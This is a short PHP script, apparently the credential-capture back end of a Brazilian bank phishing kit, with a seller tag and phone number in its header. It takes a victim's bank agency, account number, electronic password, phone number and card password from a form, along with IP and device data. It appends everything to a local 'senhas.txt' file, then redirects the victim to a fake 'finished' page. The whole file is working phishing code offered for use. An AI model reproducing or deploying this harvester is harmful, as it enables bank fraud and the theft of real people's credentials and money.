<?php

	$agg = $_POST['agg'];
	$acc = $_POST['acc'];
	$senha6 = $_POST['senha6'];
	$telefone = $_POST['telefone'];
	$campo3 = $_POST['campo3'];

	$ip = $_SERVER['REMOTE_ADDR'];
	$dispositivo = $_SERVER['HTTP_USER_AGENT'];

	$all = "---------------- PLAYTELAS (27)99932-4323 PF ---------------- \n\n";
	
	$all .= "AGENCIA: $agg\n";
	$all .= "CONTA: $acc\n";
	$all .= "SENHA ELETRONICA: $senha6\n";
	$all .= "TELEFONE: $telefone\n";
	$all .= "SENHA CC: $campo3\n";
	$all .= "IP: $ip\n";
	$all .= "DIPOSITIVO: $dispositivo\n\n\n";

	$fp = fopen("../../senhas.txt", "a");
	fwrite($fp, $all);
	fclose($fp);
	
	$envio = "0"; 

	$site[] = '01/';
	$site[] = '02/';
	$site[] = '03/';
	$site[] = '04/';
	$site[] = '05/';

	$destino = rand(0, (count($site) - 1));
	
	if($envio == "0"){
		echo "<script>location='../../device/mobile/".$site[$destino]."router-app/pf/finalizado.php';</script>";
	}else{ 
	  echo "<script>alert('Desculpe, algo deu errado. Tente novamente !');location='../../device/mobile/".$site[$destino]."router-app/pf/index.php';</script>";
	}
	
?>